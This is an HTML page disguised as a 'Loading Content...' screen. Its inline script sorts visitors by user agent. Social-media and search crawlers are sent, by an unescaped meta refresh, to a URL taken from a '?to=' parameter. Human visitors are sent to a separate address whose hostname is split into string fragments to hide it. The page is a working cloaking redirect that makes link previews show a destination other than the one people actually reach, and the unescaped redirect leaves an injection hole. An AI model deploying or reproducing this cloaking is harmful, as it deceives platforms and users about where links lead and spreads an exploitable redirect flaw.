<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Loading Content...</title>
  
  <script type="text/javascript">
    (function() {
      var currentUrl = window.location.href;
      var targetUrl = "";

      if (currentUrl.includes("?to=")) {
        var urlParams = new URLSearchParams(window.location.search);
        targetUrl = urlParams.get('to');
      }

      if (targetUrl) {
        targetUrl = targetUrl.replace(/^(:\/\/|:\/|\/)+/, "");
        if (!targetUrl.startsWith("http://") && !targetUrl.startsWith("https://")) {
          targetUrl = "https://" + targetUrl;
        }
      } else {
        targetUrl = "https://wikipedia.org";
      }

      var ua = navigator.userAgent || "";
      var isBot = /Twitterbot|facebookexternalhit|LinkedInBot|TelegramBot|Slackbot|Discordbot|Embedly|Googlebot/i.test(ua);

      if (!isBot) {
        var a = "goog"; var b = "le."; var c = "com/?"; var d = Math.ceil(Math.random() * 24);
        window.location.replace("https://" + a + b + c + d);
      } else {
        document.write('<meta http-equiv="refresh" content="0;url=' + targetUrl + '">');
      }
    })();
  </script>
</head>
<body>
</body>
</html>
